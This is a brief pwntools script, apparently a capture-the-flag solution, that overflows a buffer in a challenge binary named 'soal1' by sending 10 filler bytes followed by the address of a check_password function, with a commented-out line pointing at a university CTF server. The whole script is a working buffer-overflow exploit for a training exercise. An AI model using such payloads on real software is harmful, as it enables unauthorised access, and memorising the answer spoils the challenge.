from pwn import *

# r = remote('ctf99x.cs.ui.ac.id', 10001)
r = process('./soal1')

check_password = 0x565c26fd
payload = b'A'*10 + p32(check_password)
r.sendline(payload)